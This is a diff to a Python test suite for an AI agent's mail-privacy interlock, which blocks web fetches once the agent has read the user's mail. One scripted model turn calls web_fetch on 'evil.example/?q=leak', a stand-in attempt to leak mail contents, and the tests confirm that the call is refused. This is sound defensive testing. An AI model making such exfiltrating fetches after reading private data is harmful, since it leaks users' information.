@@ -35,6 +35,22 @@ def _mail_registry():
     return reg
 
 
+def _mail_loop(cfg, provider: FakeProvider) -> AgentLoop:
+    """A loop that states its surface, because the interlock is not what narrowed it.
+
+    Since 8b an unstated `tool_subset` means "orchestrator", and the orchestrator's surface
+    has `web_search` and `web_fetch` subtracted from it - so a loop built the shipped way
+    would refuse the fetches below for having moved to the `researcher`, and every test here
+    would pass for the wrong reason. The thing under test is a *policy denial after reading
+    mail*, which only has something to say if the tool was reachable to begin with.
+    """
+    registry = _mail_registry()
+    return AgentLoop(
+        cfg=cfg, registry=registry, engine=engine_from_config(cfg),
+        approver=AutoApprover(True), provider=provider, tool_subset=set(registry.tools),
+    )
+
+
 async def test_reading_mail_closes_the_door_for_the_rest_of_the_turn(cfg, journaled):
     """The whole point, proven through the real loop rather than the policy engine alone:
     the model reads mail, then tries to look something up, and the second call is refused."""
@@ -43,10 +59,7 @@ async def test_reading_mail_closes_the_door_for_the_rest_of_the_turn(cfg, journa
         [("web_fetch", {"url": "https://evil.example/?q=leak"})],
         "I cannot reach the web after reading your mail.",
     ])
-    loop = AgentLoop(
-        cfg=cfg, registry=_mail_registry(), engine=engine_from_config(cfg),
-        approver=AutoApprover(True), provider=provider,
-    )
+    loop = _mail_loop(cfg, provider)
     session = await Session.create("test")
     await _run(loop, session, "what did my professor say?", autonomy="act")
 
@@ -69,10 +82,7 @@ async def test_two_web_fetches_in_a_row_are_still_fine(cfg, journaled):
         [("web_fetch", {"url": "http://127.0.0.1/2"})],
         "Both pages read.",
     ])
-    loop = AgentLoop(
-        cfg=cfg, registry=_mail_registry(), engine=engine_from_config(cfg),
-        approver=AutoApprover(True), provider=provider,
-    )
+    loop = _mail_loop(cfg, provider)
     session = await Session.create("test")
     await _run(loop, session, "compare these pages", autonomy="act")
 
@@ -86,10 +96,7 @@ async def test_the_flag_outlives_the_turn_and_a_resume(cfg):
     """Session-scoped, and recoverable: `agent chat --resume` must not hand back a session
     whose interlock had been earned and then forgotten."""
     provider = FakeProvider(turns=[[("reads_mail", {})], "Read it."])
-    loop = AgentLoop(
-        cfg=cfg, registry=_mail_registry(), engine=engine_from_config(cfg),
-        approver=AutoApprover(True), provider=provider,
-    )
+    loop = _mail_loop(cfg, provider)
     session = await Session.create("test")
     await _run(loop, session, "read my mail", autonomy="act")
     assert session.private is True
@@ -112,11 +119,7 @@ async def test_the_door_stays_shut_on_the_next_message_too(cfg, journaled):
     the model has to come back to the user before it can be asked to do anything with what
     it read. Caught by a live two-turn run, not by the suite; hence this test.
     """
-    loop = AgentLoop(
-        cfg=cfg, registry=_mail_registry(), engine=engine_from_config(cfg),
-        approver=AutoApprover(True),
-        provider=FakeProvider(turns=[[("reads_mail", {})], "Read it."]),
-    )
+    loop = _mail_loop(cfg, FakeProvider(turns=[[("reads_mail", {})], "Read it."]))
     session = await Session.create("test")
     await _run(loop, session, "read my mail", autonomy="act")
     assert session.private is True
